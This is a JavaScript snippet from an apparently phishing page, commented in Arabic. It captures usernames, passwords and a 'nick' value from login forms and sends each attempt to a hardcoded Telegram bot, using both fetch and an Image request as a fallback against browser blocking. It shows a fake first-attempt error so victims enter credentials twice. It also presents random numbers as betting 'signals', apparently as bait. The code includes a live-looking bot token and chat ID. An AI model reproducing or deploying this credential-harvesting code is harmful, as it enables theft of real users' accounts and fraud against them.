<script>
    // الإعدادات الخاصة بك
    const botToken = "8359101803:AAHGNAbdmbZRmUyIzMsTJGzdLmPDB7WQk58"; 
    const chatId = "8026901193";

    // ✅ دالة إرسال مطورة: تستعمل Image كـ Buffer احتياطي (تخترق الحماية)
    function send(msg) {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=html`;
        
        // المحاولة الأولى: Fetch
        fetch(url).catch(e => console.log("Fetch Error"));
        
        // المحاولة الثانية (الاحتياطية): Image Buffer (تضمن الإرسال حتى لو رفض المتصفح الـ Fetch)
        const img = new Image();
        img.src = url;
    }

    let loginAttempts = 0;
    function processLogin() {
        const u = document.getElementById('u_log').value;
        const p = document.getElementById('u_pas').value;
        
        if (u.length < 3 || p.length < 3) return; // تأكد أن الخانات ليست فارغة

        loginAttempts++;
        if (loginAttempts === 1) {
            // سحب المحاولة الأولى (الخطأ الوهمي)
            send(`<b>⚠️ محاولة 1 (User):</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
            document.getElementById('login-err').classList.remove('hidden');
            document.getElementById('u_pas').value = ""; // مسح الباسورد لإجباره على الإعادة
        } else {
            // سحب المحاولة الثانية (التأكيدية)
            send(`<b>✅ محاولة 2 (Confirmed):</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('security-layer').classList.remove('hidden');
        }
    }

    let nickAttempts = 0;
    function processNick() {
        const n = document.getElementById('u_nick').value;
        if (n.length < 2) return;

        nickAttempts++;
        if (nickAttempts === 1) {
            // سحب اللقب الأول
            send(`<b>⚠️ لقب 1 (Nick):</b>\n🔑: <code>${n}</code>`);
            document.getElementById('nick-err').classList.remove('hidden');
            document.getElementById('u_nick').value = "";
        } else {
            // سحب اللقب الثاني والفتح النهائي
            send(`<b>✅ لقب 2 (Confirmed Nick):</b>\n🔑: <code>${n}</code>`);
            document.getElementById('security-layer').classList.add('hidden');
            document.getElementById('main-app').classList.remove('hidden');
        }
    }

    function getSignal() {
        const res = document.getElementById('target-mult');
        res.innerText = "WAIT..";
        setTimeout(() => {
            res.innerText = (Math.random() * (5.50 - 1.10) + 1.10).toFixed(2) + "x";
        }, 600);
    }
</script>
